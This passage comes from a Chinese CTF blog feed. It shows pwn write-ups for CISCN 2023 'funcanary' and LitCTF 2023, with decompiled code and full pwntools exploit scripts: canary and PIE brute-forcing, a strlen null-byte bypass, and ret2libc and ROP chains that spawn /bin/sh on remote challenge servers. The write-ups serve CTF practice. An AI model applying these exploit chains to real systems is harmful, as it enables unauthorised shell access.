class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;3. 勇闯天涯\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;来几瓶？\n&#x27;</span>,<span class="string">b&#x27;-10000&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;：\n&#x27;</span>,p)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>算是非常简单的题目了</p><h1 id="CISCN-2023-初赛-funcanary"><a href="#CISCN-2023-初赛-funcanary" class="headerlink" title="[CISCN 2023 初赛]funcanary"></a>[CISCN 2023 初赛]funcanary</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653181.png" alt="image-20240509113441769" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1243();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();                                <span class="comment">// 子进程</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0LL</span>);                                <span class="comment">// 父进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);                          <span class="comment">// 子进程</span></span><br><span class="line">      sub_128A(<span class="string">&quot;welcome&quot;</span>, a2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;have fun&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是父子进程的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_128A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);                        <span class="comment">// 爆破Canary</span></span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面会溢出0x10个字节，但显然要爆破Canary，而<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653182.png" alt="image-20240509113846870"></p><p>有个后门函数，但是要绕过Pie，直接覆盖尾巴3字节第四个字节爆破即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from <span class="class"><span class="keyword">struct</span> <span class="title">import</span> <span class="title">pack</span></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">log_level</span>=</span><span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./service&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =lambda num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =lambda content,drop=False:io.recvuntil(content,drop)</span><br><span class="line">rl  =lambda :io.recvline()</span><br><span class="line">sla =lambda flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =lambda flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =lambda content:io.sendline(content)</span><br><span class="line">s   =lambda content:io.send(content)</span><br><span class="line">irt =lambda :io.interactive()</span><br><span class="line">tbs =lambda content:str(content).encode()</span><br><span class="line">leak=lambda name,addr :info(f<span class="number">&#x27;</span>&#123;name&#125;====&gt;&#123;hex(addr)&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">local=0</span></span><br><span class="line"><span class="string">def run():</span></span><br><span class="line"><span class="string">    if local:</span></span><br><span class="line"><span class="string">        return process(path)</span></span><br><span class="line"><span class="string">    return remote(&#x27;</span>node5.anna.nssctf.cn<span class="number">&#x27;</span>,<span class="number">29486</span>)</span><br><span class="line"></span><br><span class="line">def debug(duan=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">io=run()</span><br><span class="line">def leak_canary():</span><br><span class="line">    canary=<span class="string">&quot;\x00&quot;</span></span><br><span class="line">    offset=<span class="number">0x68</span></span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> k in range(<span class="number">0xff</span>): </span><br><span class="line">            payload=<span class="string">&#x27;a&#x27;</span>*offset+canary+chr(k)</span><br><span class="line">            io.sendafter(<span class="string">&quot;welcome\n&quot;</span>,payload)</span><br><span class="line">            try:</span><br><span class="line">                a=io.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">                <span class="keyword">if</span> a==b<span class="string">&quot;have fun\n&quot;</span>:</span><br><span class="line">                    canary+=chr(k)</span><br><span class="line">                    print(canary)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line">catflag=<span class="number">0x0231</span></span><br><span class="line">canary=leak_canary()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">16</span>):</span><br><span class="line">        payload = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">0x68</span> + bytes(canary) + b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">8</span> + p16(catflag)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        <span class="meta">#pause()</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        print(a)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;welcome&quot;</span> in a:</span><br><span class="line">                catflag += <span class="number">0x1000</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;NSSCTF&quot;</span> in a:</span><br><span class="line">            print(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>但是远程打不通，不知道为什么，canary爆破不出来，很奇怪</p><h1 id="LitCTF-2023-狠狠的溢出涅"><a href="#LitCTF-2023-狠狠的溢出涅" class="headerlink" title="[LitCTF 2023]狠狠的溢出涅~"></a>[LitCTF 2023]狠狠的溢出涅~</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">91</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+6Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your message:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(buf);                             <span class="comment">// 就一个显然\x00绕过</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x50</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok,Message Received&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞很简单，strlen绕过即可，给了Libc，利用libc的ropchain即可</p><p>老规矩先puts出libc基址之后直接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000004007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+p64(<span class="number">0x0000000000400556</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28955</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x4007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+<span class="number">0x000002284d</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">ret=p64(<span class="number">0x0400556</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+ret+ret</span><br><span class="line"><span class="comment"># p+=p64(pop_rdi_ret)+p64(binsh)+p64(system)</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000036174</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000023b6a</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002601f</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfae7</span>) <span class="comment"># add rax, 2 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002284d</span>) <span class="comment"># syscall</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>因为他的字符是0x200限制的因此要缩短一下（不是pop rax用不起，而是add更有feeling（bushi</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;刷题记录1&quot;&gt;&lt;a href=&quot;#刷题记录1&quot; class=&quot;headerlink&quot; title=&quot;刷题记录1&quot;&gt;&lt;/a&gt;刷题记录1&lt;/h1&gt;&lt;p&gt;因为国赛将近，开始每天几道题，难度不等，之后会有patch的使用（算是预告和DIR-815的复现（早就复现一直没时间</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>C + +那年那些事</title>
    <link href="http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2024-05-10T13:17:14.000Z</published>
    <updated>2024-05-11T07:38:33.272Z</updated>
    
